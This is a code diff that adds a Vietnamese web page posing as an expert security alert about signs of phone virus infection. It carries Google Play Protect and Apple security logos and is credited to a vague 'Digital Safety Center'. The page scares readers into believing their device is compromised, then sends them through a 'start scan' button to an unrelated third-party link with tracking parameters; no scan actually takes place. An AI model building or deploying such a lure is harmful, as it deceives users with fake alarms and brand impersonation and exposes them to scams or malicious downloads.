@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chuyên gia cảnh báo: Điện thoại của bạn có thể đã bị nhiễm virus</title>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      color: #222;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 30px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .security-logos {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+
+    .security-logos img {
+      height: 50px;
+      object-fit: contain;
+    }
+
+    h1 {
+      color: #c62828;
+      font-size: 28px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .author {
+      font-style: italic;
+      font-size: 14px;
+      text-align: right;
+      margin-bottom: 30px;
+      color: #666;
+    }
+
+    p {
+      font-size: 17px;
+      line-height: 1.7;
+    }
+
+    ol {
+      padding-left: 20px;
+      margin-top: 20px;
+    }
+
+    li {
+      margin-bottom: 15px;
+    }
+
+    .cta {
+      background-color: #fff3e0;
+      border: 1px solid #ffc107;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+      margin-top: 40px;
+    }
+
+    .cta p {
+      font-size: 18px;
+      margin-bottom: 16px;
+    }
+
+    button {
+      background-color: #d32f2f;
+      color: #fff;
+      padding: 14px 28px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #b71c1c;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+
+      h1 {
+        font-size: 22px;
+      }
+
+      .security-logos img {
+        height: 40px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="security-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Google_Play_Protect_badge.svg/2560px-Google_Play_Protect_badge.svg.png" alt="Google Play Protect">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Apple_Security_Seal.png/440px-Apple_Security_Seal.png" alt="Apple Security">
+    </div>
+
+    <h1>Chuyên gia cảnh báo: 10 dấu hiệu điện thoại của bạn có thể đã bị nhiễm virus</h1>
+    <div class="author">Bài viết bởi Trung tâm An toàn Kỹ thuật số - Ngày 2/6/2025</div>
+
+    <p>Trong bối cảnh điện thoại di động trở thành thiết bị không thể thiếu trong đời sống hàng ngày, nguy cơ bị tấn công bởi phần mềm độc hại (malware) ngày càng gia tăng. Dưới đây là 10 dấu hiệu phổ biến cho thấy thiết bị của bạn có thể đã bị nhiễm virus hoặc phần mềm gián điệp.</p>
+
+    <ol>
+      <li><strong>Hiệu năng giảm rõ rệt:</strong> Máy trở nên chậm chạp bất thường khi mở ứng dụng hoặc thực hiện thao tác đơn giản.</li>
+      <li><strong>Pin hao nhanh:</strong> Pin tụt mà không rõ lý do, dù bạn không sử dụng nhiều.</li>
+      <li><strong>Dữ liệu di động tăng đột biến:</strong> Lưu lượng 3G/4G bị tiêu tốn nhiều mà bạn không biết vì sao.</li>
+      <li><strong>Xuất hiện quảng cáo bất thường:</strong> Nhiều quảng cáo hiện lên ngay cả khi không dùng trình duyệt hoặc app.</li>
+      <li><strong>Ứng dụng lạ tự cài:</strong> Một số ứng dụng bạn không nhớ đã tải xuất hiện trong máy.</li>
+      <li><strong>Điện thoại tự hoạt động:</strong> Gửi tin nhắn, gọi điện, hoặc bật app mà không có thao tác của bạn.</li>
+      <li><strong>Thiết bị nóng bất thường:</strong> Máy quá nhiệt kể cả khi đang ở chế độ nghỉ.</li>
+      <li><strong>Thông báo hệ thống đáng ngờ:</strong> Nhận các cảnh báo giả mạo với nội dung đe dọa.</li>
+      <li><strong>Trình duyệt bị chuyển hướng:</strong> Khi mở web, bạn bị dẫn đến trang lạ hoặc nội dung không an toàn.</li>
+      <li><strong>Tài khoản bị truy cập trái phép:</strong> Nhận thông báo đăng nhập lạ từ các dịch vụ Google, Facebook,…</li>
+    </ol>
+
+    <p>Nếu bạn thấy mình đang gặp từ 2 dấu hiệu trở lên, rất có thể thiết bị đã bị xâm nhập. Đừng lo, bạn có thể kiểm tra ngay lập tức!</p>
+
+    <div class="cta">
+      <p><strong>👉 Nhấn vào nút bên dưới để bắt đầu quét & kiểm tra bảo mật cho điện thoại của bạn:</strong></p>
+      <button onclick="window.location.href='https://singingfiles.com/show.php?l=0&u=2400929&id=45740'">
+        Bắt đầu kiểm tra ngay
+      </button>
+    </div>
+  </div>
+</body>
+</html>
